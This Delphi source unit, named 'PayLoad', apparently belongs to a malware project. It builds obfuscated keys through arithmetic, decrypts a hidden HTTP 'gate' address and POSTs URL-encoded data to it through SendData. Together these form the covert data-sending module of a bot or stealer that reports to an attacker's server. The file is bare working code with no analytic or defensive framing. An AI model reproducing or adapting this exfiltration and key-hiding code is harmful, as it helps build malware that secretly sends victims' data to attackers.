unit PayLoad;
{$I MSender.Inc}

interface

  function GetWorkFileName(const AMask: string): string;
  function SendData(AData: string): Boolean;
  function GateUrl: string;
  procedure MakeInternalKeys;



implementation

uses
  Windows, SysUtils, HttpWrk, Crypto, GlobalVar, synacode, Patterns;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
{* Возвращает путь из которого запущен модуль-родитель dll                                        *}
function GetExeFilePath(hModule: Cardinal): string;
var
  szFileName: array[0..MAX_PATH - 1] of Char;
  iSize: Integer;
begin
  ZeroMemory(@szFileName, MAX_PATH);
  iSize := GetModuleFileName(hModule, szFileName, Length(szFileName));
  if iSize > 0 then
     Result := ExtractFilePath(StrPas(szFileName))
  else
     Result := '';
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
procedure MakeInternalKeys;
begin
  iK1 := 0; iK2 := 0; iK3 := 0;

  // 4518
  iK1 := 9037;
  iK1 := Trunc(iK1/2);

  // 328917
  iK2 := 328;
  iK2 := iK2*1000;
  iK2 := iK2 + 916;
  Inc(iK2);

  // 614245
  iK3 := 614;
  iK3 := iK3*1000;
  iK3 := iK3 + 242;
  iK3 := iK3 + Trunc(pi);
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function GetWorkFileName(const AMask: string): string;
var
  SearchRec: TSearchRec;
  ExeDir: string;
begin
  Result := '';

  try
    ExeDir := GetExeFilePath(0);
    if FindFirst(ExeDir + AMask, faAnyFile, SearchRec) = 0 then
    repeat
      Result := ExeDir + SearchRec.Name;
      Break;
    until FindNext(SearchRec) <> 0;
  finally
    FindClose(SearchRec);
  end;
end;

{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function GateUrl: string;
var
  S: string;
  Idx: Integer;
begin
  Result := '';

  S := Decrypt(HTTP_GATE_URL, gK1, gK2, gK3);
  Idx := Pos(#0#0#0#0, S);
  if Idx > 0 then
     Result := Copy(S, 1, Idx - 1);
end;


{++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++}
function SendData({const }AData: string): Boolean;
var
  {S, }Url, UrlData: string;
begin
  Result := False;

  UrlData := DecStr(SRV_MI_PAT) + EncodeURLElement(AData);
  Url := GateUrl;
{$IFDEF DBG_OUTPUT}
  WriteLn('Url: ' + Url);
{$ENDIF}

  Http_PostURL(Url, UrlData);

//  if DecryptProc(@ParseURL, $1F8) then
//     Http_PostURL(Url, UrlData);

end;


end.
